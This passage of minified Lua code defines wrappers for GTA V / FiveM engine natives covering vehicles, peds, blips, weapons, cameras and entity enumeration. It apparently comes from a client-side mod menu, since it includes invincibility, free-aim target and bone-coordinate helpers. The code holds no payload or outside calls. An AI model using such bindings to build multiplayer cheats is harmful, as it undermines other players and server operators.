        return a.InvokeNative(0x8C4B92553E4766A5, vehicle, c0,
                              a.ReturnResultAnyway())
    end
    function b.GetVehicleNeonLightsColour(vehicle)
        return a.InvokeNative(0x7619EEE8C886757F, vehicle, a.PointerValueInt(),
                              a.PointerValueInt(), a.PointerValueInt())
    end
    function b.GetVehicleTyreSmokeColor(vehicle)
        return a.InvokeNative(0xB635392A4938B3C3, vehicle, a.PointerValueInt(),
                              a.PointerValueInt(), a.PointerValueInt())
    end
    function b.IsToggleModOn(vehicle, bu)
        return a.InvokeNative(0x84B233A8C8FC8AE7, vehicle, bu,
                              a.ReturnResultAnyway())
    end
    function b.GetVehicleLivery(ca)
        return a.InvokeNative(0x2BB9230590DA5E8A, ca, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetEntityMaxHealth(_)
        return a.InvokeNative(0x15D757606D170C3C, _, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetVehicleMod(vehicle, bu)
        return a.InvokeNative(0x772960298DA26FDB, vehicle, bu,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.GetDisplayNameFromVehicleModel(I)
        return a.InvokeNative(0xB215AAC32D25D019, b.GetHashKey(I),
                              a.ReturnResultAnyway(), a.ResultAsString())
    end
    function b.RequestModel(cb)
        return a.InvokeNative(0x963D27A58DF860AC, b.GetHashKey(cb))
    end
    function b.HasModelLoaded(cb)
        return a.InvokeNative(0x98A4EB5D89A0C952, b.GetHashKey(cb),
                              a.ReturnResultAnyway())
    end
    function b.SetTextRightJustify(C)
        return a.InvokeNative(0x6B3C4650BC8BEE47, C)
    end
    function b.ClearAllHelpMessages()
        return a.InvokeNative(0x6178F68A87A4D3A0)
    end
    function b.BeginTextCommandWidth(h)
        return a.InvokeNative(0x54CE8AC98E120CAB, c._tostring2(h))
    end
    function b.EndTextCommandGetWidth(aj)
        return a.InvokeNative(0x85F061DA64ED2F67, aj, a.ReturnResultAnyway(),
                              a.ResultAsFloat())
    end
    function b.AddTextComponentString(h)
        return a.InvokeNative(0x6C188BE134E074AA, c._tostring2(h))
    end
    function b.IsModelValid(cb)
        return a.InvokeNative(0xC0296A2EDF545E92, b.GetHashKey(cb),
                              a.ReturnResultAnyway())
    end
    function b.CancelOnscreenKeyboard()
        return a.InvokeNative(0x58A39BE597CE99CD)
    end
    function b.GetOnscreenKeyboardResult()
        return a.InvokeNative(0x8362B09B91893647, a.ReturnResultAnyway(),
                              a.ResultAsString())
    end
    function b.GetNumResources()
        return a.InvokeNative(0x863f27b, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetResourceByFindIndex(cc)
        return a.InvokeNative(0x387246b7, cc, a.ReturnResultAnyway(),
                              a.ResultAsString())
    end
    function b.SetRunSprintMultiplierForPlayer(ag, cd)
        return a.InvokeNative(0x6DB47AA77FD94E09, ag, cd)
    end
    function b.SetSwimMultiplierForPlayer(ag, cd)
        return a.InvokeNative(0xA91C6F0FF7D16A13, ag, cd)
    end
    function b.GetMaxAmmoInClip(Q, R, al)
        return a.InvokeNative(0xA38DCFFCEA8962FA, Q, b.GetHashKey(R), al,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.SetVehicleForwardSpeed(vehicle, aV)
        return a.InvokeNative(0xAB54A438726D25D5, vehicle, aV)
    end
    function b.SetVehicleReduceGrip(vehicle, C)
        return a.InvokeNative(0x222FF6A823D122E2, vehicle, C)
    end
    function b.GetEntityPlayerIsFreeAimingAt(ag, _)
        return a.InvokeNative(0x2975C866E6713290, ag,
                              a.PointerValueIntInitialized(_),
                              a.ReturnResultAnyway())
    end
    function b.SetVehicleNeonLightsColour(vehicle, M, N, O)
        return a.InvokeNative(0x8E0A582209A62695, vehicle, M, N, O)
    end
    function b.RemoveWeaponFromPed(Q, R)
        return a.InvokeNative(0x4899CB088EDF59B8, Q, b.GetHashKey(R))
    end
    function b.SetVehicleHalt(vehicle, ax, ce, cf)
        return a.InvokeNative(0x260BE8F09E326A20, vehicle, ax, ce, cf)
    end
    function b.SetPedRandomComponentVariation(Q, a0)
        return a.InvokeNative(0xC8A9481A01E63C28, Q, a0)
    end
    function b.SetPedRandomProps(Q)
        return a.InvokeNative(0xC44AA05345C992C6, Q)
    end
    function b.ClearPedBloodDamage(Q)
        return a.InvokeNative(0x8FE22675A5A45817, Q)
    end
    function b.StopScreenEffect(cg)
        return a.InvokeNative(0x068E835A1D0DC0E3, c._tostring2(cg))
    end
    function b.NetworkSetNetworkIdDynamic(ch, C)
        return a.InvokeNative(0x2B1813ABA29016C5, ch, C)
    end
    function b.SetNetworkIdExistsOnAllMachines(ci, C)
        return a.InvokeNative(0xE05E81A888FA63C8, ci, C)
    end
    function b.NetToPed(cj)
        return a.InvokeNative(0xBDCD95FC216A8B3E, cj, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.TaskCombatPed(Q, ck, al, aw)
        return a.InvokeNative(0xF166E48407BAC484, Q, ck, al, aw)
    end
    function b.NetworkHasControlOfEntity(_)
        return a.InvokeNative(0x01BF60A500E28887, _, a.ReturnResultAnyway())
    end
    function b.SetNetworkIdCanMigrate(ci, C)
        return a.InvokeNative(0x299EEB23175895FC, ci, C)
    end
    function b.NetworkGetNetworkIdFromEntity(_)
        return a.InvokeNative(0xA11700682F3AD45C, _, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetVehicleMaxNumberOfPassengers(vehicle)
        return a.InvokeNative(0xA7C4F2C6E744A550, vehicle,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.GetGameplayCamRelativeHeading()
        return a.InvokeNative(0x743607648ADD4587, a.ReturnResultAnyway(),
                              a.ResultAsFloat())
    end
    function b.GetGameplayCamRelativePitch()
        return a.InvokeNative(0x3A6867B4845BEDA2, a.ReturnResultAnyway(),
                              a.ResultAsFloat())
    end
    function b.GetEntityVelocity(_)
        return a.InvokeNative(0x4805D2B1D8CF94A9, _, a.ReturnResultAnyway(),
                              a.ResultAsVector())
    end
    function b.ClearTimecycleModifier()
        return a.InvokeNative(0x0F07E7745A236711)
    end
    function b.GetDisabledControlNormal(ah, ai)
        return a.InvokeNative(0x11E65974A982637C, ah, ai,
                              a.ReturnResultAnyway(), a.ResultAsFloat())
    end
    function b.GetGroundZFor_3dCoord(E, F, G, ab)
        return a.InvokeNative(0xC906A7DAB05C8D2B, E, F, G,
                              a.PointerValueFloat(), ab, a.ReturnResultAnyway())
    end
    function b.GetOffsetFromEntityInWorldCoords(_, cl, cm, cn)
        return a.InvokeNative(0x1899F328B0E12848, _, cl, cm, cn,
                              a.ReturnResultAnyway(), a.ResultAsVector())
    end
    function b.GetPedBoneCoords(Q, co, cl, cm, cn)
        return a.InvokeNative(0x17C07FC640E86B4E, Q, co, cl, cm, cn,
                              a.ReturnResultAnyway(), a.ResultAsVector())
    end
    function b.IsPedArmed(Q, a0)
        return a.InvokeNative(0x475768A975D5AD17, Q, a0, a.ReturnResultAnyway())
    end
    function b.IsPedWeaponReadyToShoot(Q)
        return a.InvokeNative(0xB80CA294F2F26749, Q, a.ReturnResultAnyway())
    end
    function b.SetPedShootsAtCoord(Q, E, F, G, C)
        return a.InvokeNative(0x96A05E4FB321B1BA, Q, E, F, G, C)
    end
    function b.SetEntityLodDist(_, c1)
        return a.InvokeNative(0x5927F96A78577363, _, c1)
    end
    function b.SetModelAsNoLongerNeeded(cb)
        return a.InvokeNative(0xE532F5D78798DAAB, b.GetHashKey(cb))
    end
    function b.FreezeEntityPosition(_, C)
        return a.InvokeNative(0x428CA6DBD1094446, _, C)
    end
    function b.GetModelDimensions(I)
        return a.InvokeNative(0x03E8D3D5F549087A, b.GetHashKey(I),
                              a.PointerValueVector(), a.PointerValueVector())
    end
    function b.DrawLine(aM, aN, aO, aP, aQ, aR, u, v, w, x)
        return a.InvokeNative(0x6B7256074AE34680, aM, aN, aO, aP, aQ, aR, u, v,
                              w, x)
    end
    function b.GetFirstBlipInfoId(cp)
        return a.InvokeNative(0x1BEDE233E6CD2A1F, cp, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.DoesBlipExist(ba)
        return a.InvokeNative(0xA6DB27D19ECBB7DA, ba, a.ReturnResultAnyway())
    end
    function b.GetBlipInfoIdCoord(ba)
        return a.InvokeNative(0xFA7C7F0AADF25D09, ba, a.ReturnResultAnyway(),
                              a.ResultAsVector())
    end
    function b.GetGameplayCamRot(bG)
        return a.InvokeNative(0x837765A25378F0BB, bG, a.ReturnResultAnyway(),
                              a.ResultAsVector())
    end
    function b.IsEntityOnScreen(_)
        return a.InvokeNative(0xE659E47AF827484B, _, a.ReturnResultAnyway())
    end
    function b.DrawMarker(type, bH, bI, bJ, cq, cr, cs, bD, bE, bF, ct, cu, cv,
                          u, v, w, x, cw, cx, cy, cz, o, p, cA)
        return a.InvokeNative(0x28477EC23D892089, type, bH, bI, bJ, cq, cr, cs,
                              bD, bE, bF, ct, cu, cv, u, v, w, x, cw, cx, cy,
                              cz, c._tostring2(o), c._tostring2(p), cA)
    end
    function b.SetPedToRagdoll(Q, cB, cC, cD, bC, bN, cE)
        return a.InvokeNative(0xAE99FB955581844A, Q, cB, cC, cD, bC, bN, cE,
                              a.ReturnResultAnyway())
    end
    function b.DetachEntity(_, a0, b4)
        return a.InvokeNative(0x961AC54BF0613F5D, _, a0, b4)
    end
    function b.ClearPedSecondaryTask(Q)
        return a.InvokeNative(0x176CECF6F920D707, Q)
    end
    function b.GetClosestVehicle(E, F, G, cF, I, cG)
        return a.InvokeNative(0xF73EB622C4F1689B, E, F, G, cF, b.GetHashKey(I),
                              cG, a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.TaskPlayAnim(Q, cH, cI, cJ, cK, ce, cL, cM, cN, cO, cP)
        return a.InvokeNative(0xEA47FE3719165B94, Q, c._tostring2(cH),
                              c._tostring2(cI), cJ, cK, ce, cL, cM, cN, cO, cP)
    end
    function b.GetPlayersLastVehicle()
        return a.InvokeNative(0xB6997A7EB3F5C8C0, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.IsPedInVehicle(Q, vehicle, bR)
        return a.InvokeNative(0xA3EE4A07279BB9DB, Q, vehicle, bR,
                              a.ReturnResultAnyway())
    end
    function b.SetPedRagdollOnCollision(Q, C)
        return a.InvokeNative(0xF0A4F1BBF4FA7497, Q, C)
    end
    function b.SetPedRagdollForceFall(Q)
        return a.InvokeNative(0x01F6594B923B9251, Q, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.IsEntityInAir(_)
        return a.InvokeNative(0x886E37EC497200B6, _, a.ReturnResultAnyway())
    end
    function b.SetEntityProofs(_, cQ, cR, cS, cT, cU, cE, aT, cV)
        return a.InvokeNative(0xFAEE099C6F890BB8, _, cQ, cR, cS, cT, cU, cE, aT,
                              cV)
    end
    function b.SetPlayerInvincible(ag, C)
        return a.InvokeNative(0x239528EACDC3E7DE, ag, C)
    end
    function b.IsEntityVisible(_)
        return a.InvokeNative(0x47D6F43D77935C75, _, a.ReturnResultAnyway())
    end
    function b.IsPedDeadOrDying(Q, a0)
        return a.InvokeNative(0x3317DEDB88C95038, Q, a0, a.ReturnResultAnyway())
    end
    function b.HasEntityClearLosToEntity(aY, aZ, cW)
        return a.InvokeNative(0xFCDFF7B72D23A1AC, aY, aZ, cW,
                              a.ReturnResultAnyway())
    end
    function b.RequestWeaponAsset(R, a0, al)
        return a.InvokeNative(0x5443438F033E29C3, b.GetHashKey(R), a0, al)
    end
    function b.HasWeaponAssetLoaded(R)
        return a.InvokeNative(0x36E353271F0E90EE, b.GetHashKey(R),
                              a.ReturnResultAnyway())
    end
    function b.GetVehiclePedIsUsing(Q)
        return a.InvokeNative(0x6094AD011A2EA87D, Q, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetVehicleHeadlightsColour(vehicle, c7)
        return a.InvokeNative(0xE41033B25D003A07, vehicle, c7)
    end
    function b.GetCurrentPedWeapon(Q, al)
        return a.InvokeNative(0x3A87E44BB9A01D54, Q, a.PointerValueInt(), al,
                              a.ReturnResultAnyway())
    end
    function b.GetBlipFromEntity(_)
        return a.InvokeNative(0xBC8DBDCA2436F7E8, _, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetBlipSprite(ba, bd)
        return a.InvokeNative(0xDF735600A4696DAF, ba, bd)
    end
    function b.AddBlipForEntity(_)
        return a.InvokeNative(0x5CDE92C702A8FCE7, _, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetBlipSprite(ba)
        return a.InvokeNative(0x1FC877464A04FC4F, ba, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetVehicleNumberOfPassengers(vehicle)
        return a.InvokeNative(0x24CB2137731FFE89, vehicle,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.IsVehicleSeatFree(vehicle, b8)
        return a.InvokeNative(0x22AC59A870E6A669, vehicle, b8,
                              a.ReturnResultAnyway())
    end
    function b.ShowNumberOnBlip(ba, cX)
        return a.InvokeNative(0xA3C0B359DCB848B6, ba, cX)
    end
    function b.HideNumberOnBlip(ba)
        return a.InvokeNative(0x532CFF637EF80148, ba)
    end
    function b.SetBlipRotation(ba, cY)
        return a.InvokeNative(0xF87683CDF73C3F6E, ba, cY)
    end
    function b.SetBlipNameToPlayerName(ba, ag)
        return a.InvokeNative(0x127DE7B20C60A6A3, ba, ag)
    end
    function b.SetBlipScale(ba, z)
        return a.InvokeNative(0xD38744167B2FA257, ba, z)
    end
    function b.IsPauseMenuActive()
        return a.InvokeNative(0xB0034A223497FFCB, a.ReturnResultAnyway())
    end
    function b.SetBlipAlpha(ba, x)
        return a.InvokeNative(0x45FF974EEE1C8734, ba, x)
    end
    function b.RemoveBlip(ba)
        return a.InvokeNative(0x86A652570E5F25DD,
                              a.PointerValueIntInitialized(ba))
    end
    function b.GetCurrentServerEndpoint()
        return a.InvokeNative(0xea11bfba, a.ReturnResultAnyway(),
                              a.ResultAsString())
    end
    function b.GetFrameCount()
        return a.InvokeNative(0xFC8202EFC642E6F2, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetWeaponDamage(R, cZ)
        return a.InvokeNative(0x3133B907D8B32053, b.GetHashKey(R), cZ,
                              a.ReturnResultAnyway(), a.ResultAsFloat())
    end
    function b.StartShapeTestRay(aM, aN, aO, aP, aQ, aR, cG, _, c_)
        return a.InvokeNative(0x377906D8A31E5586, aM, aN, aO, aP, aQ, aR, cG, _,
                              c_, a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.GetShapeTestResult(d0)
        return a.InvokeNative(0x3D87450E15D98694, d0, a.PointerValueInt(),
                              a.PointerValueVector(), a.PointerValueVector(),
                              a.PointerValueInt(), a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetCamMatrix(d1)
        return a.InvokeNative(0x8f57a89d, d1, a.PointerValueVector(),
                              a.PointerValueVector(), a.PointerValueVector(),
                              a.PointerValueVector())
    end
    function b.SetFocusPosAndVel(E, F, G, cl, cm, cn)
        return a.InvokeNative(0xBB7454BAFF08FE25, E, F, G, cl, cm, cn)
    end
    function b.GetCamCoord(bx)
        return a.InvokeNative(0xBAC038F7459AE5AE, bx, a.ReturnResultAnyway(),
                              a.ResultAsVector())
    end
    function b.SetEntityCollision(_, C, d2)
        return a.InvokeNative(0x1A9205C1B9EE827F, _, C, d2)
    end
    function b.DoesCamExist(bx)
        return a.InvokeNative(0xA7A932170592B50E, bx, a.ReturnResultAnyway())
    end
    function b.IsEntityAnObject(_)
        return a.InvokeNative(0x8D68C8FD0FACA94E, _, a.ReturnResultAnyway())
    end
    function b.IsEntityAPed(_)
        return a.InvokeNative(0x524AC5ECEA15343E, _, a.ReturnResultAnyway())
    end
    function b.IsEntityAVehicle(_)
        return a.InvokeNative(0x6AC7003FA6E5575E, _, a.ReturnResultAnyway())
    end
    function b.SetPlayerModel(ag, cb)
        return a.InvokeNative(0x00A1CADD00108836, ag, b.GetHashKey(cb))
    end
    function b.CreateAmbientPickup(d3, bH, bI, bJ, cG, c1, I, d4, c_)
        return a.InvokeNative(0x673966A0C0FD7171, b.GetHashKey(d3), bH, bI, bJ,
                              cG, c1, b.GetHashKey(I), d4, c_,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.SetPedCanSwitchWeapon(Q, C)
        return a.InvokeNative(0xED7F7EFE9FABF340, Q, C)
    end
    function b.SetPedCombatAttributes(Q, d5, d6)
        return a.InvokeNative(0x9F7794730795E019, Q, d5, d6)
    end
    function b.GetPedBoneIndex(Q, co)
        return a.InvokeNative(0x3F428D08BE5AAE31, Q, co, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.TaskVehicleDriveToCoord(Q, vehicle, E, F, G, aV, cE, d7, d8, d9,
                                       da)
        return a.InvokeNative(0xE2A2AA2F659D77A7, Q, vehicle, E, F, G, aV, cE,
                              b.GetHashKey(d7), d8, d9, da)
    end
    function b.SetBlipAsFriendly(ba, C)
        return a.InvokeNative(0x6F6F290102C02AB4, ba, C)
    end
    function b.BeginTextCommandSetBlipName(db)
        return a.InvokeNative(0xF9113A30DE5C6670, c._tostring2(db))
    end
    function b.EndTextCommandSetBlipName(ba)
        return a.InvokeNative(0xBC38B49BCB83BC9B, ba)
    end
    function b.TaskVehicleShootAtPed(Q, dc, al)
        return a.InvokeNative(0x10AB107B887214D8, Q, dc, al)
    end
    function b.TaskHeliChase(dd, de, E, F, G)
        return a.InvokeNative(0xAC83B1DB38D0ADA0, dd, de, E, F, G)
    end
    function b.SetVehicleJetEngineOn(vehicle, C)
        return a.InvokeNative(0xB8FBC8B1330CA9B4, vehicle, C)
    end
    function b.SetDriverAbility(df, dg)
        return a.InvokeNative(0xB195FFA8042FC5C3, df, dg)
    end
    function b.SetHeliBladesFullSpeed(vehicle)
        return a.InvokeNative(0xA178472EBB8AE60D, vehicle)
    end
    function b.GetObjectOffsetFromCoords(a4, a5, a6, heading, dh, di, dj)
        return a.InvokeNative(0x163E252DE035A133, a4, a5, a6, heading, dh, di,
                              dj, a.ReturnResultAnyway(), a.ResultAsVector())
    end
    function b.CreatePedInsideVehicle(vehicle, aW, I, dk, J, K)
        return a.InvokeNative(0x7DD959874C1FD534, vehicle, aW, b.GetHashKey(I),
                              dk, J, K, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetVehicleNeonLightEnabled(vehicle, c0, C)
        return a.InvokeNative(0x2AA720E4287BF269, vehicle, c0, C)
    end
    function b.SetVehicleWindowTint(vehicle, dl)
        return a.InvokeNative(0x57C51E6BAD752696, vehicle, dl)
    end
    function b.SetVehicleWheelType(vehicle, dm)
        return a.InvokeNative(0x487EB21CC7295BA1, vehicle, dm)
    end
    function b.SetVehicleTyreSmokeColor(vehicle, M, N, O)
        return a.InvokeNative(0xB5BA80F839791C0F, vehicle, M, N, O)
    end
    function b.SetVehicleDirtLevel(vehicle, dn)
        return a.InvokeNative(0x79D3B596FE44EE8B, vehicle, dn)
    end
    function b.SetVehicleLights(vehicle, dp)
        return a.InvokeNative(0x34E710FF01247C5A, vehicle, dp)
    end
    function b.TaskVehiclePark(Q, vehicle, E, F, G, heading, dq, cF, dr)
        return a.InvokeNative(0x0F3E34E968EA374E, Q, vehicle, E, F, G, heading,
                              dq, cF, dr)
    end
    function b.GetNthClosestVehicleNode(E, F, G, ds, dt, du, dv)
        return a.InvokeNative(0xE50E52416CCF948B, E, F, G, ds,
                              a.PointerValueVector(), dt, du, dv,
                              a.ReturnResultAnyway())
    end
    function b.SetDriverAggressiveness(df, dw)
        return a.InvokeNative(0xA731F608CA104E3C, df, dw)
    end
    function b.TaskVehicleDriveToCoordLongrange(Q, vehicle, E, F, G, aV, dx, d9)
        return a.InvokeNative(0x158BB33F920D360C, Q, vehicle, E, F, G, aV, dx,
                              d9)
    end
    function b.GetVehicleModelMaxSpeed(I)
        return a.InvokeNative(0xF417C2502FFFED43, b.GetHashKey(I),
                              a.ReturnResultAnyway(), a.ResultAsFloat())
    end
    function b.GetBlipInfoIdIterator()
        return a.InvokeNative(0x186E5D252FA50E7D, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetEntityMaxSpeed(_, aV)
        return a.InvokeNative(0x0E46A3FCBDE2A1B1, _, aV)
    end
    function b.TaskVehicleDriveWander(Q, vehicle, aV, dy)
        return a.InvokeNative(0x480142959D337D00, Q, vehicle, aV, dy)
    end
    function b.GetTextScaleHeight(A, dz)
        return a.InvokeNative(0xDB88A37483346780, A, dz, a.ReturnResultAnyway(),
                              a.ResultAsFloat())
    end
    function b.IsPedAPlayer(Q)
        return a.InvokeNative(0x12534C348C6CB68B, Q, a.ReturnResultAnyway())
    end
    function b.SetFollowPedCamViewMode(dA)
        return a.InvokeNative(0x5A4F9EDF1673F704, dA)
    end
    function b.SetDiscordAppId(dB)
        return a.InvokeNative(0x6a02254d, c._tostring2(dB))
    end
    function b.SetDiscordRichPresenceAsset(dC)
        return a.InvokeNative(0x53dfd530, c._tostring2(dC))
    end
    function b.SetDiscordRichPresenceAssetText(h)
        return a.InvokeNative(0xb029d2fa, c._tostring2(h))
    end
    function b.SetDiscordRichPresenceAssetSmall(dC)
        return a.InvokeNative(0xf61d04c4, c._tostring2(dC))
    end
    function b.SetDiscordRichPresenceAssetSmallText(h)
        return a.InvokeNative(0x35e62b6a, c._tostring2(h))
    end
    function b.SetEntityHasGravity(_, C)
        return a.InvokeNative(0x4A4722448F18EEF5, _, C)
    end
    function b.SetVehicleEnginePowerMultiplier(vehicle, c1)
        return a.InvokeNative(0x93A3996368C94158, vehicle, c1)
    end
    function b.GetAspectRatio(O)
        return a.InvokeNative(0xF1307EF624A80D87, O, a.ReturnResultAnyway(),
                              a.ResultAsFloat())
    end
    function b.EndTextCommandGetLineCount(E, F)
        return a.InvokeNative(0x9040DFB09BE75706, E, F, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.TaskVehicleFollow(df, vehicle, dD, aV, dy, dE)
        return a.InvokeNative(0xFC545A9F0626E3B6, df, vehicle, dD, aV, dy, dE)
    end
    function b.GetGameplayCamCoords()
        return a.InvokeNative(0xA200EB1EE790F448, a.ReturnResultAnyway(),
                              a.ResultAsVector())
    end
    function b.GetWaterHeight(E, F, G, t)
        return a.InvokeNative(0xF6829842C06AE524, E, F, G,
                              a.PointerValueFloatInitialized(t),
                              a.ReturnResultAnyway())
    end
    function b.SetEntityDynamic(_, C)
        return a.InvokeNative(0x1718DE8E3F2823CA, _, C)
    end
    function b.SetVehicleHandlingFloat(vehicle, dF, dG, c1)
        return a.InvokeNative(0x488c86d2, vehicle, c._tostring2(dF),
                              c._tostring2(dG), c1)
    end
    function b.GetVehicleHandlingFloat(vehicle, dF, dG)
        return a.InvokeNative(0x642fc12f, vehicle, c._tostring2(dF),
                              c._tostring2(dG), a.ReturnResultAnyway(),
                              a.ResultAsFloat())
    end
    function b.GetCurrentResourceName()
        return a.InvokeNative(0xe5e9ebbb, a.ReturnResultAnyway(),
                              a.ResultAsString())
    end
    function b.GetWeapontypeGroup(R)
        return a.InvokeNative(0xC3287EE3050FB74C, b.GetHashKey(R),
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.GetSelectedPedWeapon(Q)
        return a.InvokeNative(0x0A6DB4965674D243, Q, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.DrawMarker_2(type, bH, bI, bJ, cq, cr, cs, bD, bE, bF, ct, cu,
                            cv, u, v, w, x, cw, cx, cy, cz, o, p, cA, dH)
        return a.InvokeNative(0xE82728F0DE75D13A, type, bH, bI, bJ, cq, cr, cs,
                              bD, bE, bF, ct, cu, cv, u, v, w, x, cw, cx, cy,
                              cz, c._tostring2(o), c._tostring2(p), cA, dH)
    end
    function b.SetVehicleNumberPlateText(vehicle, dI)
        return a.InvokeNative(0x95A88F0B409CDA47, vehicle, c._tostring2(dI))
    end
    function b.SetVehicleDoorsLocked(vehicle, dJ)
        return a.InvokeNative(0xB664292EAECF7FA6, vehicle, dJ)
    end
    function b.NetworkSetFriendlyFireOption(C)
        return a.InvokeNative(0xF808475FA571D823, C)
    end
    function b.GetVehicleDoorLockStatus(vehicle)
        return a.InvokeNative(0x25BC98A59C2EA962, vehicle,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.GetIsVehicleEngineRunning(vehicle)
        return a.InvokeNative(0xAE31E7DF9B5B132E, vehicle,
                              a.ReturnResultAnyway())
    end
    function b.IsThisModelACar(cb)
        return a.InvokeNative(0x7F6DB52EEFC96DF8, b.GetHashKey(cb),
                              a.ReturnResultAnyway())
    end
    function b.StatSetInt(dK, c1, dL)
        return a.InvokeNative(0xB3271D7AB655B441, b.GetHashKey(dK), c1, dL,
                              a.ReturnResultAnyway())
    end
    function b.SetVehicleTyreBurst(vehicle, c0, dM, aw)
        return a.InvokeNative(0xEC6A202EE4960385, vehicle, c0, dM, aw)
    end
    function b.NetworkIsPlayerActive(ag)
        return a.InvokeNative(0xB8DFD30D6973E135, ag, a.ReturnResultAnyway())
    end
    function b.SetVehicleDeformationFixed(vehicle)
        return a.InvokeNative(0x953DA1E1B12C0491, vehicle)
    end
    function b.SetVehicleUndriveable(vehicle, C)
        return a.InvokeNative(0x8ABA6AF54B942B95, vehicle, C)
    end
    function b.IsEntityUpsidedown(_)
        return a.InvokeNative(0x1DBD58820FA61D71, _, a.ReturnResultAnyway())
    end
    function b.SetTimeScale(dN) return a.InvokeNative(0x1D408577D440E81E, dN) end
    function b.SetPedSuffersCriticalHits(Q, C)
        return a.InvokeNative(0xEBD76F2359F190AC, Q, C)
    end
    function b.DisplaySniperScopeThisFrame()
        return a.InvokeNative(0x73115226F4814E62)
    end
    function b.GetUtcTime()
        return a.InvokeNative(0x8117E09A19EEF4D3, a.PointerValueInt(),
                              a.PointerValueInt(), a.PointerValueInt(),
                              a.PointerValueInt(), a.PointerValueInt(),
                              a.PointerValueInt())
    end
    function b.SetPedCanBeKnockedOffVehicle(Q, dp)
        return a.InvokeNative(0x7A6535691B477C48, Q, dp)
    end
    function b.HasAnimDictLoaded(dO)
        return a.InvokeNative(0xD031A9162D01088C, c._tostring2(dO),
                              a.ReturnResultAnyway())
    end
    function b.RequestAnimDict(dO)
        return a.InvokeNative(0xD3BD40951412FEF6, c._tostring2(dO))
    end
    function b.HasAnimSetLoaded(dP)
        return a.InvokeNative(0xC4EA073D86FB29B0, c._tostring2(dP),
                              a.ReturnResultAnyway())
    end
    function b.RequestAnimSet(dP)
        return a.InvokeNative(0x6EA47DAE7FAD0EED, c._tostring2(dP))
    end
    function b.TaskStartScenarioInPlace(Q, dQ, dR, dS)
        return a.InvokeNative(0x142A02425FF02BD9, Q, c._tostring2(dQ), dR, dS)
    end
    function b.ResetPedMovementClipset(Q, a0)
        return a.InvokeNative(0xAA74EC0CB0AAEA2C, Q, a0)
    end
    function b.SetPedMovementClipset(Q, dT, al)
        return a.InvokeNative(0xAF8A94EDE7712BEF, Q, c._tostring2(dT), al)
    end
    function b.FindFirstObject(dU)
        return a.InvokeNative(0xfaa6cb5d, a.PointerValueIntInitialized(dU),
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.FindFirstPed(dU)
        return a.InvokeNative(0xfb012961, a.PointerValueIntInitialized(dU),
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.FindFirstPickup(dU)
        return a.InvokeNative(0x3ff9d340, a.PointerValueIntInitialized(dU),
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.FindFirstVehicle(dU)
        return a.InvokeNative(0x15e55694, a.PointerValueIntInitialized(dU),
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.FindNextObject(dV, dU)
        return a.InvokeNative(0x4e129dbf, dV, a.PointerValueIntInitialized(dU),
                              a.ReturnResultAnyway())
    end
    function b.FindNextPed(dV, dU)
        return a.InvokeNative(0xab09b548, dV, a.PointerValueIntInitialized(dU),
                              a.ReturnResultAnyway())
    end
    function b.FindNextPickup(dV, dU)
        return a.InvokeNative(0x4107ef0f, dV, a.PointerValueIntInitialized(dU),
                              a.ReturnResultAnyway())
    end
    function b.FindNextVehicle(dV, dU)
        return a.InvokeNative(0x8839120d, dV, a.PointerValueIntInitialized(dU),
                              a.ReturnResultAnyway())
    end
    function b.EndFindObject(dV) return a.InvokeNative(0xdeda4e50, dV) end
    function b.EndFindPed(dV) return a.InvokeNative(0x9615c2ad, dV) end
    function b.EndFindPickup(dV) return a.InvokeNative(0x3c407d53, dV) end
    function b.EndFindVehicle(dV) return a.InvokeNative(0x9227415a, dV) end
    function b.GetActivePlayers()
        return c._msgpack.unpack(a.InvokeNative(0xcf143fb9,
                                                a.ReturnResultAnyway(),
                                                a.ResultAsObject()))
    end
    function b.StartNetworkedParticleFxNonLoopedOnEntity(cg, _, cl, cm, cn, bD,
                                                         bE, bF, z, dW, dX, dY)
        return a.InvokeNative(0xC95EB1DB6E92113D, c._tostring2(cg), _, cl, cm,
                              cn, bD, bE, bF, z, dW, dX, dY,
                              a.ReturnResultAnyway())
    end
    function b.RequestNamedPtfxAsset(dC)
        return a.InvokeNative(0xB80D8756B4668AB6, c._tostring2(dC))
    end
    function b.HasNamedPtfxAssetLoaded(dC)
        return a.InvokeNative(0x8702416E512EC454, c._tostring2(dC),
                              a.ReturnResultAnyway())
    end
    function b.UseParticleFxAssetNextCall(bj)
        return a.InvokeNative(0x6C38AF3693A69A91, c._tostring2(bj))
    end
    function b.GetDisabledControlNormal(ah, ai)
        return a.InvokeNative(0x11E65974A982637C, ah, ai,
